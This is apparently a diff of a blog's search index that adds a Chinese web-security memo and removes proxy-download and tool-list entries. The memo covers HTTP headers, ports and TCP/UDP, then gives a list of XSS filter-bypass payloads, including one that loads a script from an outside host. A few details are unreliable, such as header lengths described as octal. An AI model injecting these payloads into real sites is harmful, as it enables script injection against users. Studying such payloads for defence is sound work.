-<p>&nbsp;&nbsp;&nbsp;<img src="https://i.loli.net/2018/08/10/5b6d5b0696832.png" height="20px"  width="25px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>&lt;img src=”<a class="link"   href="https://i.loli.net/2018/08/10/5b6d69daea50a.png&quot;"  target="_blank" rel="noopener">https://i.loli.net/2018/08/10/5b6d69daea50a.png&quot;<i class="fas fa-external-link-alt"></i></a> height=”10px” width=”10px” &gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><img src="https://i.loli.net/2018/08/10/5b6d5b5544a7b.png" height="20px" width="25px">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br><img src="https://i.loli.net/2018/08/10/5b6d5c637c372.png" height="25px"  width="25px"></p>
-<table>
+    <title>web安全备忘录</title>
+    <url>/2020/06/18/network-security-basic/</url>
+    <content><![CDATA[<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><ol>
+<li><a href="#1">基本网络思维模型</a></li>
+<li><a href="#2">TCP&amp;UDP 笔记</a></li>
+<li><a href="#3">XSS 备忘录</a></li>
+<li><a href="#4">SSRF 备忘录</a></li>
+<li><a href="#5">逻辑漏洞备忘录</a></li>
+<li><a href="#6">上传漏洞备忘录</a></li>
+<li><a href="#7">PHP 远程代码执行备忘录</a></li>
+<li><a href="#8">引用XXE 外部实体注入</a></li>
+<li><a href="#9">RCE_bypass 笔记</a><a id="more"></a>
+<h3 id="0x1-基本网络思维模型"><a href="#0x1-基本网络思维模型" class="headerlink" title="0x1 基本网络思维模型"></a>0x1 <a name="1">基本网络思维模型</a></h3><h5 id="1-1-技术架构CS-Client-Server"><a href="#1-1-技术架构CS-Client-Server" class="headerlink" title="1.1  技术架构CS(Client/Server)"></a>1.1  技术架构CS(Client/Server)</h5><code>Client</code> 指的是客户端，我们每个人的电脑都可以当做一个客户端，日常的一些上网，使用谷歌浏览器搜索东西，打开视频软件浏览视频，打开音乐播放器下载歌曲…这些操作都是要与远方的另一台电脑进行通信的，远方的那台计算机称为服务器<code>（Server）</code>。<h5 id="1-2-技术架构BS-Browser-Server"><a href="#1-2-技术架构BS-Browser-Server" class="headerlink" title="1.2 技术架构BS(Browser/Server)"></a>1.2 技术架构BS(Browser/Server)</h5>通过浏览器访问服务器端的都可以称为BS架构。</li>
+</ol>
+<p><em>Tips：通常的话 <code>BS</code> 架构也是在 <code>CS</code> 架构里面的，但是因为互联网发展迅速，更新换代太快，所以单独将 <code>BS</code> 架构这块分了出来。</em></p>
+<h5 id="1-3-HTTP请求头"><a href="#1-3-HTTP请求头" class="headerlink" title="1.3 HTTP请求头"></a>1.3 HTTP请求头</h5><table>
 <thead>
 <tr>
-<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win</th>
-<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Mac</th>
-<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iOS</th>
-<th align="center">&nbsp;&nbsp;&nbsp;&nbsp;Android</th>
+<th><strong>协议头</strong></th>
+<th><strong>说明</strong></th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="center"><a class="link"   href="https://stusmanraschid-my.sharepoint.com/:u:/g/personal/roy_stu_smanra_sch_id/ERZyynbnsBVJnuhWfSG_nSYBLm9Akvg_1j-8EhTbyD35dw?e=H6CCtS"  target="_blank" rel="noopener">windows<i class="fas fa-external-link-alt"></i></a></td>
-<td align="center"><a class="link"   href="https://stusmanraschid-my.sharepoint.com/:u:/g/personal/roy_stu_smanra_sch_id/EcWUjcEomntOobsSqmhjPWgBIejGykM4PeeRaf_UxzyNVg?e=zdSSvl"  target="_blank" rel="noopener">Mac<i class="fas fa-external-link-alt"></i></a></td>
-<td align="center">联系我下载</td>
-<td align="center"><a class="link"   href="https://stusmanraschid-my.sharepoint.com/:u:/g/personal/roy_stu_smanra_sch_id/EXFjOweAE4tPt_yEB1bLnDIBzAzPQ3zVgakBtOQkbXMD1g?e=a7X8ZN"  target="_blank" rel="noopener">Android<i class="fas fa-external-link-alt"></i></a></td>
+<td>X-Forwarded-For</td>
+<td>用来表示 HTTP 请求端真实 IP</td>
+</tr>
+<tr>
+<td>Accept</td>
+<td>可接受的响应内容类型（Content-Types）</td>
+</tr>
+<tr>
+<td>Accept-Charset</td>
+<td>可接受的字符集</td>
+</tr>
+<tr>
+<td>Accept-Encoding</td>
+<td>可接受的响应内容的编码方式</td>
+</tr>
+<tr>
+<td>Accept-Language</td>
+<td>可接受的响应内容语言列表</td>
+</tr>
+<tr>
+<td>Accept-Datetime</td>
+<td>可接受的按照时间来表示的响应内容版本</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>由之前服务器通过Set-Cookie（见下文）设置的一个HTTP协议Cookie</td>
+</tr>
+<tr>
+<td>Content-Length</td>
+<td>以8进制表示的请求体的长度</td>
+</tr>
+<tr>
+<td>Content-MD5</td>
+<td>请求体的内容的二进制 MD5 散列值（数字签名），以 Base64 编码的结果</td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>请求体的MIME类型 （用于POST和PUT请求中）</td>
+</tr>
+<tr>
+<td>Date</td>
+<td>发送该消息的日期和时间</td>
+</tr>
+<tr>
+<td>Expect</td>
+<td>表示客户端要求服务器做出特定的行为</td>
+</tr>
+<tr>
+<td>From</td>
+<td>发起此请求的用户的邮件地址</td>
+</tr>
+<tr>
+<td>Host</td>
+<td>表示服务器的域名以及服务器所监听的端口号。</td>
+</tr>
+<tr>
+<td>Origin</td>
+<td>发起一个针对跨域资源共享的请求（该请求要求服务器在响应中加入一个Access-Control-Allow-Origin的消息头，表示访问控制所允许的来源）。</td>
+</tr>
+<tr>
+<td>Range</td>
+<td>表示请求某个实体的一部分，字节偏移以0开始。</td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏览器带到了当前页面。</td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>浏览器的身份标识字符串</td>
 </tr>
 </tbody></table>
-<p><em>请低调传播</em></p>
-]]></content>
-      <categories>
-        <category>ssr</category>
-        <category>python</category>
-        <category>index</category>
-      </categories>
-      <tags>
-        <tag>ssr,shadow,collect</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>利器收集</title>
-    <url>/2020/02/11/tool-colloections/</url>
-    <content><![CDATA[<p><img src="http://imgs.yrzdm.com/imgs/20200211/SomvGyOBuRLo.png" alt="mark"><br>收集了经常用到的工具，为了年纪大了不太好的记忆。</p>
-<a id="more"></a>
-<h3 id="web工具"><a href="#web工具" class="headerlink" title="web工具"></a>web工具</h3><ol>
-<li>typora<br><img src="http://imgs.yrzdm.com/imgs/20200211/PuAjqMvUv3Ry.png" alt="mark"><br><a class="link"   href="http://www.typora.io"  target="_blank" rel="noopener">Typora<i class="fas fa-external-link-alt"></i></a></li>
-<li>markdown转换为html,pdf<br><a class="link"   href="http://md.aclickall.com"  target="_blank" rel="noopener">Md2All<i class="fas fa-external-link-alt"></i></a></li>
-<li>将代码片段生成图片<br><a class="link"   href="http://codezen.rishimohan.me/"  target="_blank" rel="noopener">codezen<i class="fas fa-external-link-alt"></i></a><br><a class="link"   href="https://carbon.now.sh/"  target="_blank" rel="noopener">carbon<i class="fas fa-external-link-alt"></i></a></li>
-<li>变量命名<br>类名函数名变量名不知道如何起名才好，可以用这个工具。<br><a class="link"   href="https://unbug.github.io/codelf/#%E5%B8%85%E4%B8%99"  target="_blank" rel="noopener">unbug<i class="fas fa-external-link-alt"></i></a></li>
-<li>Screenzy beautify your screenshots!<br><a class="link"   href="https://screenzy.io/"  target="_blank" rel="noopener">screenzy<i class="fas fa-external-link-alt"></i></a></li>
-<li>emojicp<br>快速复制emoji<br><a class="link"   href="https://emojicp.com/"  target="_blank" rel="noopener">emojicp<i class="fas fa-external-link-alt"></i></a></li>
-<li>mdnice<br>在线markdown排版 <a class="link"   href="https://mdnice.com/"  target="_blank" rel="noopener">mdnice<i class="fas fa-external-link-alt"></i></a>  </li>
-<li>markdown转换<br><a class="link"   href="https://tableconvert.com/"  target="_blank" rel="noopener">tableconvert<i class="fas fa-external-link-alt"></i></a>  </li>
+<h5 id="1-4-HTTP响应头"><a href="#1-4-HTTP响应头" class="headerlink" title="1.4 HTTP响应头"></a>1.4 HTTP响应头</h5><p>| <strong>响应头</strong>                  | <strong>说明</strong>                                                                                        |<br>| ————————— | ———————————————————— | —-<br>| Access-Control-Allow-Origin | 指定哪些网站可以跨域源资源共享<br>| Accept-Patch                | 指定服务器所支持的文档补丁格式<br>| Accept-Ranges               | 服务器所支持的内容范围<br>| Age                         | 响应对象在代理缓存中存在的时间，以秒为单位<br>| Allow                       | 对于特定资源的有效动作;<br>| Cache-Control               | 通知从服务器到客户端内的所有缓存机制，表示它们是否可以缓存这个对象及缓存有效时间。其单位为秒                  |<br>| Connection                  | 针对该连接所预期的选项<br>| Content-Disposition         | 对已知MIME类型资源的描述，浏览器可以根据这个响应头决定是对返回资源的动作，如：将其下载或是打开。<br>| Content-Encoding            | 响应资源所使用的编码类型。<br>| Content-Language            | 响应内容所使用的语言<br>| Content-Length              | 响应消息体的长度，用8进制字节表示<br>| Content-Location            | 所返回的数据的一个候选位置<br>| Content-Type                | 当前内容的MIME类型<br>| Date                        | 此条消息被发送时的日期和时间<br>| Location                    | 用于在进行重定向，或在创建了某个新资源时使用。<br>| Proxy-Authenticate          | 要求在访问代理时提供身份认证信息。<br>| Refresh                     | 用于重定向，或者当一个新的资源被创建时。默认会在5秒后刷新重定向。<br>| Server                      | 服务器的名称<br>| Set-Cookie                  | 设置HTTP cookie<br>| Status                      | 通用网关接口的响应头字段，用来说明当前HTTP连接的响应状态。<br>| Trailer                     | Trailer用户说明传输中分块编码的编码信息<br>| Transfer-Encoding           | 用表示实体传输给用户的编码形式。包括：chunked、compress、 deflate、gzip、identity。 </p>
+<h5 id="1-5-HTTP请求方式"><a href="#1-5-HTTP请求方式" class="headerlink" title="1.5 HTTP请求方式"></a>1.5 HTTP请求方式</h5><p>GET\POST\PUT\COPY\DELETE\OPTIONS\PATCH</p>
+<h5 id="1-6-HTTP常见状态码"><a href="#1-6-HTTP常见状态码" class="headerlink" title="1.6 HTTP常见状态码"></a>1.6 HTTP常见状态码</h5><p>200、301、302、500、404、403、502</p>
+<h5 id="1-7-GET和POST的区别"><a href="#1-7-GET和POST的区别" class="headerlink" title="1.7 GET和POST的区别"></a>1.7 GET和POST的区别</h5><p>浏览器限制<code>GET</code>接收的的长度，但是不限制<code>POST</code>提交的长度，<code>POST</code>提交的长度取决于服务器。</p>
+<p><strong>数据接收方式</strong></p>
+<p><code>GET</code>请求接收的方式是通过浏览器的地址栏来接收的，而<code>POST</code>是通过表单隐藏式的提交数据。</p>
+<h5 id="1-8-局域网的简单通信（数据链路层）"><a href="#1-8-局域网的简单通信（数据链路层）" class="headerlink" title="1.8 局域网的简单通信（数据链路层）"></a>1.8 局域网的简单通信（数据链路层）</h5><ul>
+<li>一般局域网都是通过交换机/路由器进行通信。</li>
+<li>很早之前的网络大部分是通过HUB（集线器）进行通信。</li>
+<li>缺点就是主机发送的数据包都会被其他的主机接收到，这个过程称为泛洪。</li>
+<li>交换机在此基础上进行了改进，使其变得更安全，同样也保留了HUB的一些功能。</li>
+<li>局域网通过MAC地址表来进行数据通信。</li>
+</ul>
+<h5 id="1-9-交换机主机通信过程"><a href="#1-9-交换机主机通信过程" class="headerlink" title="1.9 交换机主机通信过程"></a>1.9 交换机主机通信过程</h5><ol>
+<li>交换机 <code>ARP</code> 广播</li>
+<li><code>PC</code>计算机接收响应</li>
+<li>发送数据 —&gt; 交换机转发并记录<code>MAC</code>地址</li>
+<li>如果交换机的<code>MAC</code>表被填满，将会泛洪（<code>ARP</code>毒化）</li>
+<li><code>ARP</code>欺骗 —&gt; 伪造<code>MAC</code>地址来进行欺骗的效果</li>
 </ol>
-<h3 id="pc工具"><a href="#pc工具" class="headerlink" title="pc工具"></a>pc工具</h3><ol>
-<li>Rufus<br>制作系统盘支持win linux<br><a class="link"   href="https://github.com/pbatard/rufus"  target="_blank" rel="noopener">Rufus<i class="fas fa-external-link-alt"></i></a></li>
-<li>uTools<br>快捷启动和搜索 类似 wox<br><a class="link"   href="http://u.tools"  target="_blank" rel="noopener">uTools<i class="fas fa-external-link-alt"></i></a></li>
+<p><em>Tips：有些交换机重启的时候会清空<code>MAC</code>地址表。</em></p>
+<h3 id="0x2-TCP-amp-UDP"><a href="#0x2-TCP-amp-UDP" class="headerlink" title="0x2 TCP&amp;UDP"></a>0x2 <a name="2">TCP&amp;UDP</a></h3><h5 id="1-知名端口"><a href="#1-知名端口" class="headerlink" title="1. 知名端口"></a>1. 知名端口</h5><p>系统程序所使用的端口号</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">telnet 23 <br>ftp 21 <br>http 80 <br>https 443 <br>smtp 25 <span class="hljs-built_in"><br>dns </span>53 <br>DHCP 67 <br>tftp 69<br></code></pre></td></tr></table></figure>
+<h5 id="2-动态端口"><a href="#2-动态端口" class="headerlink" title="2. 动态端口"></a>2. 动态端口</h5><p>动态端口的范围时 1024-65535,当服务或者程序关闭时也就释放了所占用的端口</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1433 </span>MSSQL <br><span class="hljs-symbol">1521 </span>Oracle <br><span class="hljs-symbol">3306 </span>MySQL <br><span class="hljs-symbol">5432 </span>PostgreSQL <br><span class="hljs-symbol">6379 </span>redis <br><span class="hljs-symbol">27017 </span>Mongodb <br><span class="hljs-symbol">5000 </span>DB2 <br><span class="hljs-symbol">4848 </span>glassfish<br><span class="hljs-symbol">7001 </span>WebLogic <br><span class="hljs-symbol">2601 </span>zebra路由，默认密码zebra <br><span class="hljs-symbol">3389 </span>远程桌面 (shift 后门) <br><span class="hljs-symbol">8080 </span>apache tomcat <br><span class="hljs-symbol">5900 </span>vnc 虚拟网络控制台 <br><span class="hljs-symbol">11211 </span>memcache未授权访问 <br><span class="hljs-symbol">2181 </span>Zookeeper未授权访问<br></code></pre></td></tr></table></figure>
+<h5 id="3-查看端口"><a href="#3-查看端口" class="headerlink" title="3.查看端口"></a>3.查看端口</h5><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">netstat -an | <span class="hljs-keyword">grep</span> “:<span class="hljs-number">8080</span>”  <span class="hljs-comment"># 显示打开的端口所在协议。</span><br><br>lsof -i :<span class="hljs-number">8080</span>               <span class="hljs-comment"># 显示对应端口的服务名称（所用程序）。</span><br><br>netstat -anp | <span class="hljs-keyword">grep</span> “:<span class="hljs-number">8080</span>” <span class="hljs-comment"># 查看上面两条命令的综合信息</span><br></code></pre></td></tr></table></figure>
+<p><em>Tips：如果该服务不属于当前的用户，需要<code>sudo</code>权限<code>（root）</code></em></p>
+<h5 id="4-UDP协议"><a href="#4-UDP协议" class="headerlink" title="4.UDP协议"></a>4.UDP协议</h5><p><code>UDP</code>发送数据之前不需要建立连接</p>
+<h6 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h6><ol>
+<li>无连接</li>
+<li>资源开销小</li>
+<li>传输速度快</li>
+<li>udp每个数据包最大64k</li>
 </ol>
-<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><ol>
-<li>Android VivaCut<br>安卓视频剪辑<br><a href="-">Android VivaCut</a></li>
-<li>TaiChi<br>免Root Xpose框架<br><a class="link"   href="http://taichi.tool"  target="_blank" rel="noopener">TaiChi<i class="fas fa-external-link-alt"></i></a><br>🍦</li>
+<h6 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h6><ol>
+<li>传输速度快</li>
+<li>不需要连接，资源开销小</li>
 </ol>
-<p>to be continue</p>
+<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h6><p>传输数据不可靠，容易丢数据包，没有流量控制，当对方没有及时接受数据，发送方一直发送数据包会导致缓冲区数据溢出，电脑出现卡死情况，所有接受方需及时接受数据。</p>
+<h6 id="UDP-使用场景"><a href="#UDP-使用场景" class="headerlink" title="UDP 使用场景"></a>UDP 使用场景</h6><p>当对网络通讯质量要求不高的时候，要求网络通讯速度尽量的快。</p>
+<p>例如 ：</p>
+<ol>
+<li>音视频传输</li>
+<li>共享屏幕软件</li>
+<li>发送广播消息</li>
+</ol>
+<h5 id="特点：-1"><a href="#特点：-1" class="headerlink" title="特点："></a>特点：</h5><ol>
+<li>无连接</li>
+<li>资源开销小</li>
+<li>传输速度快</li>
+<li>udp每个数据包最大64k</li>
+</ol>
+<h5 id="Python-socket"><a href="#Python-socket" class="headerlink" title="Python socket"></a>Python socket</h5><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br>socket.socket(AddressFamily,Type)<br>AddressFamily：IP地址类型；AF_INET代表ipv4类型、AF_INET6表示ipv6类型；<br>Type：套接字类型，可以是SOCK_STREAM (流式套接字，主要用于TCP协议) 或者 SOCK_DGRAM（数据报套接字，UDP协议）<br></code></pre></td></tr></table></figure>
+<h5 id="5-TCP协议"><a href="#5-TCP协议" class="headerlink" title="5.TCP协议"></a>5.TCP协议</h5><h5 id="面向连接"><a href="#面向连接" class="headerlink" title="面向连接"></a>面向连接</h5><p>通信双方必须先建立连接才进行数据的传输，双方都必须为该连接分配必要的系统内核资源，以管理连接的状态和连接上的传输,双方间的数据传输都可以用过这一个连接进行,完成数据交换后，双方必须断开此连接，以释放系统资源,这种连接是一对一的，因此<code>TCP</code>不适合于广播的应用程序，基于广播的程序请使用UDP协议。</p>
+<h5 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h5><ol>
+<li><h5 id="tcp-采用发送应答机制"><a href="#tcp-采用发送应答机制" class="headerlink" title="tcp 采用发送应答机制"></a>tcp 采用发送应答机制</h5><p> <code>tcp</code>发送的每一条报文段必须得到接收方的应答才认为这个<code>tcp</code>报文段传输成功</p>
+</li>
+<li><h5 id="超时重传"><a href="#超时重传" class="headerlink" title="超时重传"></a>超时重传</h5><p> 发送端发出一个报文之后启动定时器，如果在定时时间内没有收到应答就重新发送这个报文段</p>
+</li>
+<li><h5 id="错误效验"><a href="#错误效验" class="headerlink" title="错误效验"></a>错误效验</h5><p> 检测数据到发送端到接收端之间是否有改动，直接丢弃这个数据包</p>
+</li>
+<li><h5 id="流量控制和阻塞管理"><a href="#流量控制和阻塞管理" class="headerlink" title="流量控制和阻塞管理"></a>流量控制和阻塞管理</h5><p> 流量控制用来避免主机发送得过快而使接收方来不及完全收下。</p>
+</li>
+</ol>
+<h5 id="TCP-使用场景"><a href="#TCP-使用场景" class="headerlink" title="TCP 使用场景"></a>TCP 使用场景</h5><p>当对网络通讯质量有要求的时候，比如 <code>HTTP</code>，<code>HTTPS</code>，<code>FTP</code>等网络传输协议，<code>POP</code>，<code>STMTP</code>等邮件传输协议。</p>
+<h3 id="0x3-XSS"><a href="#0x3-XSS" class="headerlink" title="0x3 XSS"></a>0x3 <a name="3">XSS</a></h3><p>XSS 又叫CSS (Cross Site Script) , 跨站脚本攻击。以下为学习《心伤的瘦子XSS系列》的个人笔记，和其他总结的内容。</p>
+<p><strong>1. 一个普通反射型的XSS</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">http:<span class="hljs-comment">//localhost/xxxxxxxssssssssssss/xss.php?name=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>2. HTML编码</strong></p>
+<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs javascript">http://   <br>&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47; <br>&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;<br></code></pre></td></tr></table></figure>
+<p>Tips: 这三个是标签是相等的,都为 <code>http://</code> ，其中 Hex 是十六进制编码,Dec 是十进制编码。</p>
+<p>这种编码在 html 执行的前提是,必须在值里例如：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;a href=”xxx”&gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">”xxx”</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<p><strong>3. Unicode编码</strong></p>
+<p>Js中是允许使用 unicode编码的。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;  ==  “\x3c” == “\u003c”<br>&gt;  ==  “\x3e” == “\u003e”<br>空格 == “\x20” == ” \u0020”<br>.....<br></code></pre></td></tr></table></figure>
+
+<p><strong>4. CSS编码</strong></p>
+<p>使用 Unicode 写中文字体名称，浏览器是可以正确的解析的。<br>例如：font-family: “5FAE8F6F96C59ED1”，表示设置字体为“微软雅黑”。<br>CSS 中 expression 用来把CSS属性和Javascript表达式关联起来。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;img src=<span class="hljs-string">"URL"</span> style=<span class="hljs-string">'Xss:expression(alert(/xss/));'</span>&gt;<br></code></pre></td></tr></table></figure>
+<p><em>Tips: 但是这种的只能在IE6 , IE7 中才会触发。</em></p>
+<p><strong>5. 宽字节</strong></p>
+<p>Gbxxx系列编码。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">%aa将%<span class="hljs-number">27</span>吞并组成一个gbxxx字符 ==&gt;  猏’<br>%aa%<span class="hljs-number">27</span> | alert(<span class="hljs-number">1</span>)<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>6. eval(string) 函数</strong></p>
+<p>eval 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span>(<span class="hljs-string">'alert(1)'</span>)<br></code></pre></td></tr></table></figure>
+
+<p><strong>7. fromcharcode() 函数</strong></p>
+<p>可接受指定的unicode编码的值，返回字符串，可以配合eval函数使用。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">alert(<span class="hljs-number">1</span>) ==&gt; <span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>)<br><br><br><span class="hljs-comment">// 结合 eval() 函数</span><br><span class="hljs-built_in">eval</span>(<span class="hljs-built_in">String</span>.fromCharCode(<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">40</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>))<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>8. 伪协议</strong></p>
+<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs javascript">Javascript:alert(document.domain) <br>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt; <br>data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== <br>vbscript: xxxx     // IE中运行<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>9. URL编码</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs url">%0a  &#x2F;&#x2F;  URL换行符  <br>%20  &#x2F;&#x2F;  空格<br>! %21 <br>&quot; %22 <br># %23 <br>$ %24 <br>% %25 <br>&amp; %26 <br>&#39; %27 <br>( %28 <br>) %29 <br>* %2A <br>+ %2B <br>......<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>10. JS 多行字符串</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">Var a=<span class="hljs-string">'\<br>Test\<br>En\<br>//coding\<br>Aaa'</span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>11. JS特性</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&amp; 比 = 优先级高<br>== 比 &amp; 优先级高<br></code></pre></td></tr></table></figure>
+
+
+<p>Javascript 是从上到下按顺序执行的。</p>
+<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs javascript">test()<br>function test()&#123;<br>//code...   这种形式定义的函数会被优先解析<br>&#125;  <br> <br># 实际解析顺序<br>function test()&#123;<br>//code...   这种形式定义的函数会被优先解析<br>&#125; <br>test()<br></code></pre></td></tr></table></figure>
+
+
+<p><strong>12. 注释符</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//             // js注释</span><br>&lt;!-- --&gt;       <span class="hljs-comment">// HTML注释</span><br><span class="hljs-comment">/**/</span>           <span class="hljs-comment">// js注释</span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>13. HTML属性</strong></p>
+<p>当元素失去焦点时发生的事件，按下tab键触发js。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">aaaa</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">aaaa</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>当元素获得焦点时发生的事件，按下tab键触发js。</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">aaaa</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">"alert(1)"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">aaaa</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p><strong>14. JS 黑魔法</strong></p>
+<p>1.jjencode –将JS代码转换成只有符号的字符串。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">网址：http:<span class="hljs-regexp">//u</span>tf-<span class="hljs-number">8</span>.jp<span class="hljs-regexp">/public/</span>jjencode.html<br></code></pre></td></tr></table></figure>
+
+<p>2.aaencode –将JS代码转换成常用的网络表情。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">网址：http:<span class="hljs-regexp">//u</span>tf-<span class="hljs-number">8</span>.jp<span class="hljs-regexp">/public/</span>aaencode.html<br></code></pre></td></tr></table></figure>
+
+<p>3.Jsfuck –使用六个不同的字符来编写和执行代码。</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">网址：http:<span class="hljs-regexp">//u</span>tf-<span class="hljs-number">8</span>.jp<span class="hljs-regexp">/public/</span>aaencode.html<br></code></pre></td></tr></table></figure>
+
+<p><strong>15. 常用绕过 Payload</strong></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&lt;svg/onload=prompt(<span class="hljs-number">1</span>);&gt;      <span class="hljs-comment">// 短的xss_payload</span><br><br>&lt;q/oncut=open()&gt;                // 短的xss_payload<br><br>&lt;q/oncut=alert(1)&gt;        // 短的xss_payload<br><br>&lt;scrip&lt;script&gt;t&gt;alealertr(1)&lt;/scrip&lt;script&gt;t&gt;   // 过滤不严<br><br>&lt;ScriPt&gt;alErT(1)&lt;/sCripT&gt;     // 大小写绕过<br><br>&lt;script&gt;prompt(1);&lt;/script&gt;   // 过滤alert 情况下<br><br>&lt;script src="http://www.secbook.info/demo.js"&gt;&lt;/script&gt;<br><br>&lt;div onclick="alert('xss')"&gt;  // 点击它后会触发<br><br>&lt;div onmouseenter="alert('xss')"&gt;  // 用户鼠标移动到 div 上时会触发<br><br>&lt;iframesrc="javascript:alert(2)"&gt;<br><br>&lt;iframe/src="data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg=="&gt;<br><br>&lt;%0ascript&gt;alert(1);&lt;/script&gt;     // 语法 BUG<br></code></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>docs</category>
+        <category>security</category>
         <category>index</category>
-        <category>Tools</category>
+      </categories>
+      <tags>
+        <tag>security</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>matplotlib去除生成图片的白边</title>
+    <url>/2021/05/12/matplotlib-remove-edge/</url>
+    <content><![CDATA[<p>使用<code>matplotlib</code>中 <code>plt.savefig()</code>保存图片，图片四周有一圈空白，考虑到这是个重复使用比较高的功能，记录下来：</p>
+<ol>
+<li><p>首先需要关闭坐标轴显示</p>
+<p><code>plt.axis(&#39;off&#39;)</code> 这样透明的坐标轴仍然会占据左下角，导致图片偏右</p>
+<p>完全去除坐标轴显示需要添加下列配置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">fig = plt.gcf()<br>fig.set_size_inches(<span class="hljs-number">7.0</span>/<span class="hljs-number">3</span>,<span class="hljs-number">7.0</span>/<span class="hljs-number">3</span>) <span class="hljs-comment">#输出图片大小和分辨率 700*700 dpi300</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>去白边配置</p>
